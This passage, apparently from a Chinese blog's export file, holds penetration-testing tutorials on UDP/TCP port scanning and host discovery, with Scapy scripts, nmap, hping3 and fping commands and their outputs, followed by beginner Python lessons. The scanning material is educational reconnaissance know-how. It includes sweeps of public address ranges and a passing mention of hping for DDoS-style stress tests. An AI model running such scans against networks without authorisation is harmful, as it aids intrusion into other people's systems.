400);do nv -nv -w 1 -z 192.168.123.33 $x: done | grep open for x in $(seq 1 254);do nc -nv -w 1 -z 192.168.3.$x 80;done]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[端口扫描-UDP]]></title>
      <url>%2F2016%2F05%2F13%2F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-UDP%2F</url>
      <content type="text"><![CDATA[0x00 前言当我们发现到存活的IP以后，那么下一步就是针对特定的主机进行端口扫描了，因为端口对应的是网络服务及其应用段的程序，端口潘多拉魔盒的入口，一旦发现开放的端口，便能以此作为后续渗透的跳板，这是完成一个完美渗透的一个重要的里程碑。 0x01 UDP端口扫描UDP端口扫描可以得到两种结果，端口开了，端口没开(废话-.-),但是主机是活的，我们也不会死的主机进行端口扫描。 假设ICMP 返回port-unreachable 响应代表端口关闭，但是如果目标系统不响应ICMP port-unreachable时，可能产生误判，而且完整的UPD应用层请求虽然准确性高，但是耗时巨大！ 了解每一种UDP的应用层协议，构成出专门对这一应用的的数据包，然后用该数据包进行扫描，将会大大得到提高！ Scapy UDP Scan直接上脚本代码了:123456789101112131415161718192021222324252627282930#!/usr/bin/pythonimport loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *import timeif len(sys.argv) != 4:#脚本本身 ip start-port end-port print &quot;Usage - ./udp_port.py [Target - TP] [First port] [Last port]&quot;#指定起始端口和结束端口 print &quot;Usage - ./udp-port.py 128.13.34.13 1 100&quot; sys.exit()ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start,end): a = sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0)#udp探测命令 time.sleep(1)#sleep一秒，等待sr1发送完成，避免网络中的延迟误判！ if a == None:#None意味着没有收到响应，代表端口是开放的 print port else:#如果得到了回应，那么一定是port-unreachable回应，代表端口没开放 pass 0x02 nmap 端扫描 { Usage $: nmap -SU ip } 对特定ip端口扫描，如果不指定端口的话，namp默认会对1000常用端口进行扫描，即使是nmap如果是基于UDP的扫描话，也只是利用了UDP端口不可达的这一个特征信息！ 123456789101112root@jack:~/scripts/端口扫描# nmap -sU 192.168.0.1 Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-13 10:37 CSTNmap scan report for 192.168.0.1Host is up (0.0036s latency).Not shown: 994 closed portsPORT STATE SERVICE53/udp open domain67/udp open|filtered dhcps123/udp open|filtered ntp1026/udp open|filtered win-rpc1027/udp open|filtered unknown1900/udp open|filtered upnp { Usage $: nmap -sU 192.168.0.1 -p53} 扫描指定端口 123456root@jack:~/scripts/端口扫描# nmap -sU 192.168.0.1 -p53Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-13 10:40 CSTNmap scan report for 192.168.0.1Host is up (0.0015s latency).PORT STATE SERVICE53/udp open domain { Usaeg $: namp -iL iplist.txt -sU -p 1-20000 } 从文件获得IP地址信息，进行批量扫描]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[四层发现]]></title>
      <url>%2F2016%2F05%2F11%2F%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[0x00 碎语首先我们要明确的是，发现的目的是扫描出可能存活的IP地址，四层发现虽然涉及端口扫描，但是并不对端口的状态进行识别，其本质是利用四层协议的一些通信来识别主机ip是否存在，至于端口的问题，以后在谈。 四层发现的优点是可路由且结果可靠；不太可能被防火墙过滤，甚至可以发现所有端口都被过滤的主机。缺点是基于状态过滤的防火墙可能过滤扫描；全端口(十几万个端口)扫描的速度慢。 0x01 四层发现如何探测目标 TCP探测正确tcp连接是通过三次握手建立通信过程，然后可以向目标发送资源申请的请求，本机再发送ack进行确认，这是一种基于连接的可靠的通信协议，当然这是正确的时候。如果我们之前没有建立tcp连接，而是直接向目标发送tcp资源请求，这时目标服务器回想本机发送一个RST包(意思是，你是谁，我不认识你啊，你不能连我哦)，因此，当目标服务器委婉且礼貌的拒绝我们时，便可以基于次探测目标主机是否存在了！这是已中国基于tcp协议的特征进行的一种判断。当然我们也可以通过正确的，即是通过三次握手建立通信连接，通过发送的SYN包来确定目标主机是否在线。 UDP探测UDP不同于TCP，UDP没有通过握手建立连接的过程，UDP只是尽力而为而已，它是一种非连接的不可靠传输协议，因此基于UDP来探测主机，难度和发现的准确率都高于TCP。同样是基于UDP的一些特征信息来探测。 如果目标ip不在线，那我们对其发送的UDP包不会有任何的回应，但假如目标Ip在线，而且发送到UDP的目标端口处于开放状态，一般说来，这时目标主机接受到我的UDP包时也不会有任何回应，但有一种列外，即是目标端口没有开放时，会向我们发送一个ICMP不可达的包(但是到这里我们并不对其端口进行扫描)。 0x02 TCP发现原理:通过非正常TCP连接，探测目标主机(防火墙，交换机，服务器)是否存在 ACK–&gt;TCP Port–&gt;RST 将TCP包头的flag位设定为ACK，然后发送给一个目标/端口，最后判断是否收到RST响应包，以此确定目标是否存在！ 无论是基于几层的探测扫描，得到结果也只不过是一种极大可能的参考，一切都可能不是真实的 Scapy构造四层TCP探测数据包先构造三层ip包，再构成四层tcp，然后将三层/四层组合起来构成一个TCP包1234567891011121314151617181920212223242526272829303132333435root@jack:~/scripts# scapyWARNING: No route found for IPv6 destination :: (no default route?)Welcome to Scapy (2.2.0)&gt;&gt;&gt; ip=IP() &gt;&gt;&gt; tcp=TCP()&gt;&gt;&gt; r=(ip/tcp)&gt;&gt;&gt; r[IP].dst=&quot;192.168.0.1&quot; #设置目标Ip地址&gt;&gt;&gt;r[TCP].flags=&quot;A&quot; #设置TCPflags为”ACK“&gt;&gt;&gt;r.display()###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= tcp chksum= None src= 192.168.0.109 #本机ip已经自动识别 dst= 192.168.0.1 #目标ip也已设置好 \options\###[ TCP ]### sport= ftp_data dport= http #默认的tcp的端口是80端口 seq= 0 ack= 0 dataofs= None reserved= 0 flags= A window= 8192 chksum= None urgptr= 0 options= &#123;&#125; 开始发包12345678910111213141516171819202122232425262728293031323334&gt;&gt;&gt; a=sr1(r)Begin emission:.Finished to send 1 packets.*Received 2 packets, got 1 answers, remaining 0 packets&gt;&gt;&gt; a.display()###[ IP ]### version= 4L ihl= 5L tos= 0x0 len= 40 id= 14705 flags= frag= 0L ttl= 64 proto= tcp chksum= 0xbfa0 src= 192.168.0.1 dst= 192.168.0.109 \options\###[ TCP ]### sport= http dport= ftp_data seq= 0 ack= 0 dataofs= 5L reserved= 0L flags= R &lt;---flags位由A变成了R window= 0 chksum= 0x2dbe urgptr= 0 options= &#123;&#125;###[ Padding ]### load= &apos;\x00\x00\x13(\x82\x9e&apos; 一条命令搞定123&gt;&gt;&gt; a=sr1(IP(dst=&quot;192.168.0.1&quot;)/TCP(dport=80,flags=&apos;A&apos;),timeout=1,verbose=0)&gt;&gt;&gt; a&lt;IP version=4L ihl=5L tos=0x0 len=40 id=50048 flags= frag=0L ttl=64 proto=tcp chksum=0x3591 src=192.168.0.1 dst=192.168.0.109 options=[] |&lt;TCP sport=http dport=ftp_data seq=0 ack=0 dataofs=5L reserved=0L flags=R window=0 chksum=0x2dbe urgptr=0 |&lt;Padding load=&apos;\x00\x00\x80+\x86\xfe&apos; |&gt;&gt;&gt; Python脚本实现TCP四层扫描12345678910111213141516171819202122#!/usr/bin/pythonimport loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!= 2: print &quot;Usage - ./ping1.py [/24 network address]&quot; print &quot;Example - ./ping1.py 128.38.28.3&quot; sys.exit()address = str(sys.argv[1])prefix = address.split(&quot;.&quot;)[0]+&apos;.&apos;+address.split(&quot;.&quot;)[1]+&apos;.&apos;+address.split(&quot;.&quot;)[2]+&apos;.&apos;for addr in range(1, 254): response = sr1(IP(dst=prefix+str(addr))/TCP(dport=2222,flags=&apos;A&apos;),timeout=0.1,verbose=0) try: if int(response[TCP].flags)==4: #tcp中Reset对应的flags是倒数第三位，2^2=4 print(prefix+str(addr)) except: pass 0x03 UDP发现一条命令搞定123&gt;&gt;&gt; a=sr1(IP(dst=&quot;192.168.0.1&quot;)/UDP(dport=7643),timeout=0.1,verbose=0)&gt;&gt;&gt; a&lt;IP version=4L ihl=5L tos=0x0 len=56 id=63680 flags= frag=0L ttl=64 proto=icmp chksum=0x46 src=192.168.0.1 dst=192.168.0.109 options=[] |&lt;ICMP type=dest-unreach code=port-unreachable chksum=0xdee4 unused=0 |&lt;IPerror version=4L ihl=5L tos=0x0 len=28 id=1 flags= frag=0L ttl=64 proto=udp chksum=0xf911 src=192.168.0.109 dst=192.168.0.1 options=[] |&lt;UDPerror sport=domain dport=7643 len=8 chksum=0x0 |&gt;&gt;&gt;&gt; Python脚本实现UDP四层扫描12345678910111213141516171819202122232425262728#!/usr/bin/pythonimport loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!= 2: print &quot;Usage - ./ping1.py [/24 network address]&quot; print &quot;Example - ./ping1.py 128.38.28.3&quot; sys.exit()address = str(sys.argv[1])prefix = address.split(&quot;.&quot;)[0]+&apos;.&apos;+address.split(&quot;.&quot;)[1]+&apos;.&apos;+address.split(&quot;.&quot;)[2]+&apos;.&apos;for addr in range(1, 254): response = sr1(IP(dst=prefix+str(addr))/UDP(dport=7634),timeout=0.1,verbose=0) try: if int(response[IP].proto)==1: #为何是protoco=1，#通过wireshark抓包可以发现#ip层有protocol字段，指向它的上层协议，TCP为6,ICMP为1,IJMP#为2，UDP为17，#由此我们可以知道ip上层协议不一定除了tcp，就是udp，#还可以是其它的很多类型的协议，在这里我们发送了一个udp包给#目标，我们由是否接受到来自目标的icmp包来判断ip是否存活 print(prefix+str(addr)) except: pass 0x04 nmap-四层发现nmap很强大，它除了可以实现三层扫描，第四层也是信手拈来，如探囊取物一般，当然他的强大远不止于此。 { Usage $: nmap [ip段] -PU[port] -sn } 只对ip段进行四层发现而不进行端口扫描,类似于UDP扫描 1234567root@jack:~/MyBlog/hexo/source/_posts# nmap 221.22.0.1-50 -PU80 -snStarting Nmap 7.01 ( https://nmap.org ) at 2016-05-11 09:07 CSTNmap scan report for softbank221022000006.bbtec.net (221.22.0.6)Host is up (0.25s latency).Nmap scan report for softbank221022000025.bbtec.net (221.22.0.25)Host is up (0.18s latency).Nmap done: 50 IP addresses (2 hosts up) scanned in 11.75 seconds 可以看到基于udp的扫描结果并不理想 { Usage $: nmap [ip段] -PA[port] -sn } 只对ip段进行四层发现而不进行端口扫描,类似于Scapy扫描 { Usage $: nmap -iL iplist.txt -PA[port] -sn} 对已有ip地址进行存活检测 无论如何，以上方法并不是适用于所有互联网设备，但是对大部分还是有所收获的 0x05 hping3 四层发现 { Usage $: hping3 -udp ip -c 1 } hping3基于udp的四层发现 udp_hping3.sh核心代码 12for addr in $(seq 1 254); do hping3 -udp $prefix.$addr -c 1 &gt;&gt; r.txt.donegrep Unreachable r.txt | cut -d&quot; &quot; -f 5 | cut -d&quot;=&quot; -f 2 {Usage $: hping3 ip -c 1} hping3基于tcp的四层发现，不加参数，默认就是 tcp_hping3.sh核心代码 123456prefix=$(echo $1 | cut -d&quot;.&quot; -f 1-3)for addr in $(seq 1 254);do hping3 $prefix.$addr -c 1 &gt;&gt; r.txtdonegrep ^len r.txt | cut -d&quot; &quot; -f 2 | cut -d&quot;=&quot; -f 2 &gt;&gt; output.txtrm r.txt 凡是hping发送的tcp所有的flags位都是not set的，即都是0的状态，它不同于udp的扫描，它通过返回的ack+rst包来判断主机存活！ hping3对四层扫描结果最不理想，当然这个就是智者见智！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[层发现]]></title>
      <url>%2F2016%2F05%2F09%2F%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[0x00 碎语IP以及ICMP协议(internet管理协议)属于三层协议，icmp的作用其实就是用来实现intenet管理的，进行路径的发现，网路通信情况，或者目标主机的状态，三层发现中主要使用icmp协议，arp协议属于二层协议，它是基于广播的，所以不可路由。而ICMP协议是可以路由的，理论上可以使用icmp协议发现全球的ip，如果么有边界防火墙(禁止icmp的探测包)进行过滤的话，对目标主机进行扫描，则会收到相应的响应，从而进行扑捉，除此以外，三层发现的扫描速度也较二层要慢些 0x01 三层发现工具 pingping使用icmp协议中两种类型的数据包，icmp协议根据包头中的type字段定义了16中(0-15)种包类型，ping发送探测数据时使用的是第8号数据包，而接收数据(如果目标主机没有防火墙的回馈信息)时使用的是第0号数据包。 除此外，linux和windows使用ping命令时发送的ping包是有很大差异了。 使用ping命令对自身网关发送5个ping包1234567root@jack:~/scripts# ping 192.168.1.1 -c 5PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.64 bytes from 192.168.1.1: icmp_seq=1 ttl=251 time=5.38 ms64 bytes from 192.168.1.1: icmp_seq=2 ttl=251 time=4.09 ms64 bytes from 192.168.1.1: icmp_seq=3 ttl=251 time=3.56 ms64 bytes from 192.168.1.1: icmp_seq=4 ttl=251 time=4.24 ms64 bytes from 192.168.1.1: icmp_seq=5 ttl=251 time=18.8 ms 可以看到从本机追踪到sina.com一共经过了10次路由跳转，其中第六次时没有返回相关信息，说明该主机很有可能开启了边界防火墙过滤规则，自动过滤了icmp包的探测。 Bash脚本实现ping命令结合bash脚本实现对IP段的扫描12345678910#!/bin/bashif [ &quot;$#&quot; -ne 1 ];then echo &quot;Usage - ./ping.sh [/24 network address]&quot; echo &quot;Usage - ./ping.sh 189.29.33.32&quot; exitfiprefix=$(echo $1 | cut -d&apos;.&apos; -f 1-3)for addr in $(seq 1 254);do ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d&apos; &apos; -f 4 | cut -d&apos;:&apos; -f 1 &amp;done Scapy先定义一个ip包头，在定义一个icmp包头，最后组合成一个ping包，然后发出去。 进入scapy12345678910111213141516171819202122232425262728root@jack:~/scripts# scapy WARNING: No route found for IPv6 destination :: (no default route?)Welcome to Scapy (2.2.0)&gt;&gt;&gt; i=IP() #先定义一个IP变量&gt;&gt;&gt; p=ICMP() #然后定义一个icmp变量&gt;&gt;&gt; ping=(i/p) #将ip包与icmp包组合成一个icmp的ping包&gt;&gt;&gt; ping.display()#显示ping包的包头结构###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= icmp chksum= None src= 127.0.0.1 dst= 127.0.0.1 \options\###[ ICMP ]### type= echo-request #已经被设置为8号包 code= 0 chksum= None id= 0x0 seq= 0x0&gt;&gt;&gt; 设置要ping的目标ip地址(dst)12345678910111213141516171819202122&gt;&gt;&gt; ping[IP].dst=&quot;192.168.1.1&quot;&gt;&gt;&gt; ping.display()###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= icmp #从这里可以知道ip的上层协议为icmp协议 chksum= None src= 192.168.0.109 #scapy会自动侦听网卡Ip地址 dst= 192.168.1.1 \options\###[ ICMP ]### type= echo-request code= 0 chksum= None id= 0x0 seq= 0x0 开始发包12345&gt;&gt;&gt; answer=sr1(ping)Begin emission:.Finished to send 1 packets..*Received 3 packets, got 1 answers, remaining 0 packets 显示下回包的内容1234567891011121314151617181920212223&gt;&gt;&gt; answer.display()###[ IP ]### version= 4L ihl= 5L tos= 0x0 len= 28 id= 25387 flags= frag= 0L ttl= 128 proto= icmp chksum= 0x558a src= 192.168.0.110 dst= 192.168.0.109 \options\###[ ICMP ]### type= echo-reply #icmp的type=0的数据包 code= 0 chksum= 0xffff id= 0x0 seq= 0x0###[ Padding ]### load= &apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&apos; 以上过程也可以使用一条命令完成，以此实现我们在Python脚本中的调用123456&gt;&gt;&gt; sr1(IP(dst=&quot;192.168.0.101&quot;)/ICMP(),Begin emission:.Finished to send 1 packets..*Received 3 packets, got 1 answers, remaining 0 packets&lt;IP version=4L ihl=5L tos=0x0 len=28 id=32352 flags= frag=0L ttl=128 proto=icmp chksum=0x3a55 src=192.168.0.110 dst=192.168.0.109 options=[] |&lt;ICMP type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |&lt;Padding load=&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&apos; 但是，如果使用scapy发送的ip地址不存在时，它会一直发包，直到对方响应为止，显然这是不想发生的，所以我们还需要使用timeout参数设定如果对方超过时间无回应则自动放弃！12&gt;&gt;&gt; sr1(IP(dst=&quot;192.168.0.111&quot;)/ICMP(), timeout=1, verbose=0)WARNING: Mac address to reach destination not found. Using broadcast. Python脚本实现 123456789101112131415161718192021#!/usr/bin/pythonimport loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!= 2: print &quot;Usage - ./ping1.py [/24 network address]&quot; print &quot;Example - ./ping1.py 128.38.28.3&quot; sys.exit()address = str(sys.argv[1])prefix = address.split(&quot;.&quot;)[0]+&apos;.&apos;+address.split(&quot;.&quot;)[1]+&apos;.&apos;+address.split(&quot;.&quot;)[2]+&quot;.&quot;for addr in range(1, 254): a=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=0.1,verbose=0) if a == None: pass else: print(prefix+str(addr)) 这里Python的脚本过于简单，并没有使用多线程取执行它，所有速度上可能略慢与bas脚本的执行速度~ 下面调用能文件内存储的IP地址对可能存活的Ip地址进行检查1234567891011121314151617181920212223#!/usr/bin/pythonimport loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!= 2: print &quot;Usage - ./ping1.py [/24 network address]&quot; print &quot;Example - ./ping1.py 128.38.28.3&quot; sys.exit()filename = str(sys.argv[1])file = open(filename, &apos;r&apos;)for addr in file: a=sr1(IP(dst=addr.strip())/ICMP(), timeout=0.1, verbose=0) if a == None: pass else: print addr.strip()运行:root@jack:~/scripts/三层扫描# ./ping2.py pingaddr.txt traceroute 路由追踪traceroute同样使用的是icmp协议，使用traceroute命令可以追踪到目标主机之间跳转了多少次路由 使用traceroute追踪到sina.com123456789101112root@jack:~# traceroute www.sina.comtraceroute to www.sina.com (218.30.108.192), 30 hops max, 60 byte packets 1 bogon (192.168.0.1) 0.931 ms 0.932 ms 0.921 ms 2 134.644.342.1 4.634 ms 5.127 ms 5.570 ms 3 5.125 ms 5.513 ms 5.525 ms 4 15.332 ms 15.726 ms 15.717 ms 5 (202.97.38.45) 39.178 ms 202.97.80.145 (202.97.80.145) 36.039 ms 35.970 ms 6 * * * 7 1062.362 ms 220.181.0.50 (220.181.0.50) 1017.043 ms * 8 180.149.128.46 (180.149.128.46) 39.002 ms * 180.149.128.146 (180.149.128.146) 41.218 ms 9 180.149.129.214 (180.149.129.214) 38.029 ms 38.058 ms 38.046 ms10 218.30.108.192 (218.30.108.192) 39.859 ms 37.563 ms 38.150 ms fping命令 fping 1.2.2.2 -c 1 fping -g 1.1.1.1 1.1.1.2 fping -g 1.1.1.0/24 fping -f iplist.txt hpinghping是一个很强大的命令，它能够发送几乎任意的TCP/IP包，除了可以一定程度上对ftp实现一个大量的压力测试(ddos)攻击，同时还可以实现第三层的扫描,但是每次只能扫描一个目标，但是这个不打紧！ hping实现三层icmp扫描1root@jack:~/scripts/三层扫描# hping3 192.168.0.1 --icmp -c 2 一行命令实现对整个ip网段的扫描1234root@jack:~/scripts/三层扫描# for addr in $(seq 1 254); do hping3\&gt; 192.168.0.$addr --icmp -c 1 &gt;&gt; handle.txt &amp; done#将结果保存到handle.txt是因为hping与fping一样，显示的信息太过杂乱，#先将其保存在文件中在进行分析 然后通过分析文本我们发现每个活着的IP都会有一个”len”字符,使用grep提取活着的ip12345root@jack:~/scripts/三层扫描# cat handle.txt | grep ^lenlen=46 ip=192.168.0.1 ttl=64 id=37158 icmp_seq=0 rtt=6.8 mslen=46 ip=192.168.0.110 ttl=128 id=21635 icmp_seq=0 rtt=3.6 mslen=46 ip=192.168.0.113 ttl=128 id=19190 icmp_seq=0 rtt=3.9 mslen=46 ip=192.168.0.104 ttl=64 id=25196 icmp_seq=0 rtt=6.3 ms]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(4)-文件处理]]></title>
      <url>%2F2016%2F05%2F09%2FPython(4)-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x00 Read and Write Files常用方法: file.close() 关闭文件，类似于File-&gt;save.. file.read() 读取文件内容 file.readline()读取整行，包括”\n”字符 file.readlines()读取所有行并返回列表。 file.seek() 返回文件当前位置 file.write() 向文件写数据 file.truncate() 截取文件，截取的字节通过size指定，默认为当前位置对于文件模式，python中的文件模式有‘w’写(write)模式‘r’读(read)模式，’a’追加(append)模式，除此以外还有修饰符’w+’,’r+’,’a+’,这样的话文件将以同时读写的方式发开，默认的open(filename)使用’r’模式打开！12345from sys import argvscript,filename=argvtxt=open(filename)print &quot;here&apos;s my file %r:&quot; % filenameprint txt.read() 0x01 More Files1234567891011121314151617from sys import argfrom os.path import existsscript,from_file,to_file=argvprint &quot;copying from %s to %s&quot; % (from_file,to_file)in_file=open(from_file)indata=in_file.read()print &quot;the input file is %d bytes long&quot; % len(indata)&#123;len函数计算文件大小&#125;print &quot;dose the output file exist?%r&quot; % exists(to_file)&#123;exists函数判断文件是否存在，存在返回&quot;TRUE&quot;&#125;print &quot;ready,hit return to continue,ctrl-c to abort&quot;raw_input()out_file=open(to_file,&apos;w&apos;)out_file.write(indata)print &quot;alright.all done&quot;out_file.close()in_file.close( 最后在控制台调用1$ python more_file.py test.txt copying.txt]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一个简单的.py脚本]]></title>
      <url>%2F2016%2F05%2F05%2F%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-py%E8%84%9A%E6%9C%AC%2F</url>
      <content type="text"><![CDATA[0x00 ex25.py本例脚本我们简单命名为ex.py，脚本内容如下:12345678910111213141516171819202122232425262728def break_words(stuff): words=stuff.split(&apos; &apos;) return wordsdef sort_words(words): return sorted(words)def print_first_word(words) word=words.pop(0) print worddef print_last_word(words) word=words.pop(-1) print worddef sort_sentence(sentence): words=break_words(sentence) return sort_words(words)def print_first_and_last(sentence): words=break_words(sentence) print_first_word(words) print_last_word(words)def print_first_and_last_sorted(sentence): words=sort_sentence(sentence) print_first_word(words) print_last_word(words) 将ex.py添加到python的安装目录:python\lib中即可在python GUI或者IDLE中调用了：1234567891011121314151617181920212223242526272829&gt;&gt; import ex25&gt;&gt;&gt; sentence = &quot;All good things come to those who wait.&quot;&gt;&gt;&gt; words = ex25.break_words(sentence)&gt;&gt;&gt; words[&apos;All&apos;, &apos;good&apos;, &apos;things&apos;, &apos;come&apos;, &apos;to&apos;, &apos;those&apos;, &apos;who&apos;, &apos;wait.&apos;]&gt;&gt;&gt; sorted_words = ex25.sort_words(words)&gt;&gt;&gt; sorted_words[&apos;All&apos;, &apos;come&apos;, &apos;good&apos;, &apos;things&apos;, &apos;those&apos;, &apos;to&apos;, &apos;wait.&apos;, &apos;who&apos;]&gt;&gt;&gt; ex25.print_first_word(words)All&gt;&gt;&gt; ex25.print_last_word(words)wait.&gt;&gt;&gt; words[&apos;good&apos;, &apos;things&apos;, &apos;come&apos;, &apos;to&apos;, &apos;those&apos;, &apos;who&apos;]&gt;&gt;&gt; ex25.print_first_word(sorted_words)All&gt;&gt;&gt; ex25.print_last_word(sorted_words)who&gt;&gt;&gt; sorted_words[&apos;come&apos;, &apos;good&apos;, &apos;things&apos;, &apos;those&apos;, &apos;to&apos;, &apos;wait.&apos;]&gt;&gt;&gt; sorted_words =ex25.sort_sentence(sentence)&gt;&gt;&gt; sorted_words[&apos;All&apos;, &apos;come&apos;, &apos;good&apos;, &apos;things&apos;, &apos;those&apos;, &apos;to&apos;, &apos;wait.&apos;, &apos;who&apos;]&gt;&gt;&gt; ex25.print_first_and_last(sentence)Allwait.&gt;&gt;&gt;ex25.print_first_and_last_sorted(sentence)Allwho]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(15)-内存使用]]></title>
      <url>%2F2016%2F05%2F05%2FPython(15)-%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[0x00Python作为一种动态类型的语言，其对象和引用分离，这曾经的面向过程语言有很打的区别，为了有效的释放内存，Python内置了垃圾回收的支持。 – 0x01 对象的内存使用在Pthon中，整数和短小的字符，Python都会缓存这些对象，以便重复使用，当我们创建多个等于1的引用时，实际上是让所有的引用指向同一个对象12345a = 1b = 1print(id(a)，id(b))#id()是python的内置函数，用于返回对象的内存地址(39019128L, 39019128L) 可见a和b实际上是指向同一个对象的引用。 我们还可以使用is关键字来判断两个引用所指的对象是否相同12345678910111213141516&gt;&gt;&gt; a = &quot;good&quot;&gt;&gt;&gt; b = &quot;good&quot;&gt;&gt;&gt; print (a is b)True&gt;&gt;&gt; a = &quot;very good&quot;&gt;&gt;&gt; b = &quot;very good&quot;&gt;&gt;&gt; print (a is b)False&gt;&gt;&gt; a = []&gt;&gt;&gt; b = []&gt;&gt;&gt; print (a is b)False&gt;&gt;&gt; a = 1&gt;&gt;&gt; b = 1&gt;&gt;&gt; print (a is b)True 可以看到所有整数1的引用都指向同一对象。即使使用赋值语句，也只是创造了新的引用，而不是对象本身。长的字符串和其它对象可以有多个相同的对象，可以使用赋值语句创建出新的对象。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(11)-装饰器(decorator)]]></title>
      <url>%2F2016%2F05%2F03%2FPython(11)-%E8%A3%85%E9%A5%B0%E5%99%A8(decorator)%2F</url>
      <content type="text"><![CDATA[0x00 初识装饰器装饰器是Python中的一种高级语法，同时也是一个很著名的设计模式，装饰器可以对一个函数，方法或者类进行加工，其作用就是为已存在的对象添加额外的功能。 现在已经存在一个函数test_func()12def test_func(): print &quot;i am test_func&quot; 我们希望知道foo()运行需要消耗多少时间，或许你会这么修改函数1234567import timedef test_func(): start = time.clock() print &quot;i am test_func&quot; end = time.clock() print &quot;used&quot;, end - start ok,你完全可以这么做，毕竟你实现了所提出的需求，不错，但是有没有想过，如果这个项目里这个函数有一万个，怎么办，copy*10000次？ No，我们只需对这个函数进行稍加”装饰“！ 现在，来看看装饰器怎么做到的12345678910111213141516171819202122import time#定义一个计时器，传入一个函数，并且返回另一附件了计时功能的函数def timeit(func): #定义一内嵌的包装函数，给传入的函数加上计时功能 def wrapper(): start = time.clock() func() end = time.clock() print &apos;used:&apos;, end - start #将包装以后的函数返回 return wrapper#@timeit在定义上与test_func = timeit(test_func)完全等价，@并不具有魔法！@timeitdef test_fun(): print &apos;hi,i am test_func&apos;test_fun()运行结果:hi,i am test_funcused: 1.62500801813e-05 ok,最初的需求通过对test_func()函数的”装饰(decorator)”实现了，在这个例子中，函数进入和退出时需要计时，这被称为一个横切面(Aspect)，这种编程方式被称为面向切面的编程(Aspect-Oriented Programming)。与传统编程习惯的从上往下执行方式相比较而言，像是在函数执行的流程中横向地插入了一段逻辑。在特定的业务领域里，能减少大量重复代码。 参考来源:http://www.cnblogs.com/huxi/http://www.cnblogs.com/vamei/ 0x01 带参数的装饰器装饰器允许我们在调用decorator时提供其他参数，比如@decorator(a),这样就又为程序的编写提供了更大的灵活性。123456789101112131415161718192021import timedef pre_str(pre = &apos; &apos;): def timeit(func): def wrapper(): start = time.clock() func() end = time.clock() print (pre + &quot;used:&quot;, end - start) return wrapper return timeit@pre_str(&apos;&quot;_&quot;&apos;)def test_fun(): print &apos;hi,i am test_func&apos;test_fun()运行结果:hi,i am test_func(&apos;&quot;_&quot;used:&apos;, 1.5394812803352647e-05) 其实我们也可以将其理解为一个含有环境变量的闭包，当我们使用@prestr(‘““‘)调用时，Python能够发现这一层的封装，并把参数传递到装饰器的环境中！ 大部分的用户都不怎么需要定义装饰器，但是有可能会使用装饰器。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(12)-动态类型(dynamic typing)]]></title>
      <url>%2F2016%2F05%2F02%2FPython(12)-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%9E%8B(dynamic-typing)%2F</url>
      <content type="text"><![CDATA[0x00对象是存储在内存中的实体,但是我们并不能直接接触到该对象，在程序中所写的对象名，只是指向这一对象的引用(reference) C中的变量比如，数字，字符串，表等等，在Python中都是对象。 对象和引用分离，是动态类型的核心,而引用可以随时指向一个新的对象。 12345a = 3a = &apos;at&apos;#开始，3是存储在内存中的一个对象，通过赋值，引用a指向对象3#然后，引用a指向了内存中的另一个对象&apos;at&apos;,是一个字符串，此时3不在有引用指向 Python会自动销毁(destruct)没用引用指向的对象，从而释放相应内存！ 123456a = 5b = aa = a+2#通过前两个句子，我们让a，b指向同一个对象#b = a的意思是让引用b指向引用a所指向的那一个对象#但第三个句子实际上是对引用a重新赋值，让a指向一个新的对象7 此时，a，b指向不同的对象。可以看到，即使是多个引用指向同一个对象，如果一个引用值发生变化，那么实际上是让这个引用再指向一个新的引用，但并不影响其它引用的指向，即是各个引用相互独立，互不影响！ 其它数据对象也是如此:123l1 = [1, 2, 4]l2 = l1l1 = 4 但是以下则不一样:12345l1 = [1, 2, 3]l2 = l1l2[2] = 99print l1,l2[1,2,99],[1,2,99] l1,l2同时发生了改变，为何?首先，我们使l2指向l1引用所指的对象，而对象是一个表，而表实际上是包含了多个引用的对象，l2[2] = 99这个操作并没有使l1，l2的指向发生变化，它们依然指向那个表，而是对l2[2]，也就是表对象的一一部分对象(元素)进行操作，所以，所有指向该对象(表中元素)的引用都受到影响！ 